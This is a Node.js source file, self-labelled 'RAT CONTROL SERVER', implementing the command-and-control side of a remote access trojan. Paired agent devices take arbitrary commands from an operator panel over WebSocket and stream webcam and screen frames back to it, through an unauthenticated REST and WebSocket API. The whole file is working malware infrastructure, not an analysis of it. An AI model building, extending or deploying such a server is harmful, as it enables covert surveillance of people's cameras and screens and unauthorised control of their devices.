const express = require('express');
const http = require('http');
const { WebSocketServer } = require('ws');
const cors = require('cors');
const crypto = require('crypto');

const app = express();
app.use(cors());
app.use(express.json());

const server = http.createServer(app);
const wss = new WebSocketServer({ server });

const PORT = process.env.PORT || 3000;

// STORAGE
const pairingCodes = new Map();  // code -> { createdAt, used, deviceId }
const devices = new Map();        // deviceId -> { ws, info, code, lastSeen }
const panels = new Set();         // panel WebSocket connections

// ============================================================
// REST API
// ============================================================

// Generate pairing code (dari panel)
app.post('/api/generate', (req, res) => {
    const code = generateCode();
    pairingCodes.set(code, {
        createdAt: Date.now(),
        used: false,
        deviceId: null
    });
    // auto expire 10 menit
    setTimeout(() => {
        if (pairingCodes.has(code) && !pairingCodes.get(code).used) {
            pairingCodes.delete(code);
        }
    }, 10 * 60 * 1000);
    res.json({ success: true, code });
});

// Device register via pairing code
app.post('/api/pair', (req, res) => {
    const { deviceId, pairingCode, userAgent, platform } = req.body;
    
    if (!pairingCode || !pairingCodes.has(pairingCode)) {
        return res.status(400).json({ success: false, message: 'Invalid pairing code' });
    }
    
    const entry = pairingCodes.get(pairingCode);
    if (entry.used) {
        return res.status(400).json({ success: false, message: 'Code already used' });
    }
    
    entry.used = true;
    entry.deviceId = deviceId;
    
    devices.set(deviceId, {
        ws: null,
        info: { userAgent, platform, deviceId },
        code: pairingCode,
        lastSeen: Date.now(),
        online: false
    });
    
    // broadcast ke semua panel
    broadcastToPanels({
        type: 'device_paired',
        deviceId,
        info: { userAgent, platform },
        code: pairingCode
    });
    
    res.json({ success: true, deviceId });
});

// List devices (dari panel)
app.get('/api/devices', (req, res) => {
    const list = [];
    devices.forEach((d, id) => {
        list.push({
            deviceId: id,
            info: d.info,
            online: d.online,
            lastSeen: d.lastSeen,
            code: d.code
        });
    });
    res.json({ success: true, devices: list });
});

// Send command ke device (dari panel)
app.post('/api/command', (req, res) => {
    const { deviceId, command, params } = req.body;
    
    if (!devices.has(deviceId)) {
        return res.status(404).json({ success: false, message: 'Device not found' });
    }
    
    const device = devices.get(deviceId);
    if (!device.ws || device.ws.readyState !== 1) {
        return res.status(400).json({ success: false, message: 'Device offline' });
    }
    
    const payload = JSON.stringify({
        command,
        params,
        timestamp: Date.now()
    });
    
    try {
        device.ws.send(payload);
        res.json({ success: true, message: 'Command sent' });
    } catch (e) {
        res.status(500).json({ success: false, message: e.message });
    }
});

// Health check
app.get('/', (req, res) => {
    res.json({
        status: 'online',
        devices: devices.size,
        panels: panels.size,
        codes: pairingCodes.size,
        uptime: process.uptime()
    });
});

// ============================================================
// WEBSOCKET
// ============================================================

wss.on('connection', (ws, req) => {
    const url = new URL(req.url, 'http://localhost');
    const path = url.pathname;
    
    // ============ DEVICE AGENT ============
    if (path === '/agent') {
        const deviceId = url.searchParams.get('deviceId');
        const code = url.searchParams.get('code');
        
        console.log(`[AGENT] Connected: ${deviceId}`);
        
        if (!deviceId || !devices.has(deviceId)) {
            ws.close();
            return;
        }
        
        const device = devices.get(deviceId);
        device.ws = ws;
        device.online = true;
        device.lastSeen = Date.now();
        
        broadcastToPanels({
            type: 'device_online',
            deviceId,
            info: device.info
        });
        
        ws.on('message', (msg) => {
            try {
                const data = JSON.parse(msg);
                device.lastSeen = Date.now();
                
                // forward ke panel
                if (data.type === 'cam_frame' || data.type === 'screen_frame') {
                    broadcastToPanels({
                        type: data.type,
                        deviceId,
                        frame: data.frame,
                        timestamp: data.timestamp
                    });
                } else if (data.type === 'ack' || data.type === 'error' || data.type === 'screen_info') {
                    broadcastToPanels({
                        ...data,
                        deviceId
                    });
                }
            } catch (e) {
                console.log('[AGENT] Parse error:', e.message);
            }
        });
        
        ws.on('close', () => {
            console.log(`[AGENT] Disconnected: ${deviceId}`);
            device.online = false;
            device.ws = null;
            device.lastSeen = Date.now();
            broadcastToPanels({
                type: 'device_offline',
                deviceId
            });
        });
        
        ws.on('error', (e) => {
            console.log(`[AGENT] Error ${deviceId}:`, e.message);
        });
    }
    
    // ============ PANEL ============
    else if (path === '/panel') {
        console.log('[PANEL] Connected');
        panels.add(ws);
        
        // kirim list device saat connect
        const list = [];
        devices.forEach((d, id) => {
            list.push({
                deviceId: id,
                info: d.info,
                online: d.online,
                lastSeen: d.lastSeen
            });
        });
        ws.send(JSON.stringify({ type: 'device_list', devices: list }));
        
        ws.on('message', (msg) => {
            try {
                const data = JSON.parse(msg);
                
                // panel kirim command ke device
                if (data.type === 'command' && data.deviceId) {
                    const device = devices.get(data.deviceId);
                    if (device && device.ws && device.ws.readyState === 1) {
                        device.ws.send(JSON.stringify({
                            command: data.command,
                            params: data.params,
                            timestamp: Date.now()
                        }));
                    }
                }
                
                // panel minta generate code
                if (data.type === 'generate_code') {
                    const code = generateCode();
                    pairingCodes.set(code, {
                        createdAt: Date.now(),
                        used: false,
                        deviceId: null
                    });
                    ws.send(JSON.stringify({ type: 'code_generated', code }));
                    setTimeout(() => {
                        if (pairingCodes.has(code) && !pairingCodes.get(code).used) {
                            pairingCodes.delete(code);
                        }
                    }, 10 * 60 * 1000);
                }
            } catch (e) {
                console.log('[PANEL] Parse error:', e.message);
            }
        });
        
        ws.on('close', () => {
            console.log('[PANEL] Disconnected');
            panels.delete(ws);
        });
        
        ws.on('error', (e) => {
            console.log('[PANEL] Error:', e.message);
        });
    }
    
    // ============ UNKNOWN ============
    else {
        ws.close();
    }
});

// ============================================================
// HELPERS
// ============================================================

function generateCode() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let code = '';
    for (let i = 0; i < 12; i++) {
        code += chars.charAt(crypto.randomInt(0, chars.length));
    }
    return code;
}

function broadcastToPanels(data) {
    const msg = JSON.stringify(data);
    panels.forEach(panel => {
        if (panel.readyState === 1) {
            try { panel.send(msg); } catch (e) {}
        }
    });
}

// cleanup device lama offline > 24 jam
setInterval(() => {
    const now = Date.now();
    devices.forEach((d, id) => {
        if (!d.online && (now - d.lastSeen) > 24 * 60 * 60 * 1000) {
            devices.delete(id);
            console.log(`[CLEANUP] Removed device: ${id}`);
        }
    });
    // cleanup code expired
    pairingCodes.forEach((c, code) => {
        if (!c.used && (now - c.createdAt) > 10 * 60 * 1000) {
            pairingCodes.delete(code);
        }
    });
}, 60 * 60 * 1000);

// ============================================================
// START
// ============================================================

server.listen(PORT, () => {
    console.log(`========================================`);
    console.log(`  RAT CONTROL SERVER`);
    console.log(`  Port   : ${PORT}`);
    console.log(`  Panel  : ws://localhost:${PORT}/panel`);
    console.log(`  Agent  : ws://localhost:${PORT}/agent`);
    console.log(`  API    : http://localhost:${PORT}/api`);
    console.log(`========================================`);
});

process.on('SIGTERM', () => {
    console.log('[SERVER] Shutting down...');
    server.close(() => process.exit(0));
});
